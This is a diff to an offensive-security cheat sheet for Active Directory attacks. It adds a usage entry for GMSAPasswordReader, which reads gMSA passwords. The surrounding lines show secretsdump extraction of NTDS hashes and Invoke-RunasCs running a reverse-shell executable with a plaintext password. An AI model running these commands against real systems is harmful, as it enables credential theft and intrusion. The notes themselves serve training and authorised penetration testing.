@@ -27,6 +27,7 @@
   - [kerbrute](#kerbrute)
   - [Impacket](#impacket)
   - [Invoke-RunasCs.ps1](#invoke-runascs.ps1)
+  - [GMSAPasswordReader](#GMSAPasswordReader)
   - [smbserver](#smbserver)
   - [chisel](#chisel)
   - [Responder](#responder)
@@ -457,6 +458,12 @@ impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
 . .\Invoke-RunasCs.ps1
 Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "whoami"
 Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command .\revshell443.exe
+```
+
+### GMSAPasswordReader
+```bash
+.\GMSAPasswordReader.exe --accountname svc_apache$
+
 ```
 
 ### smbserver
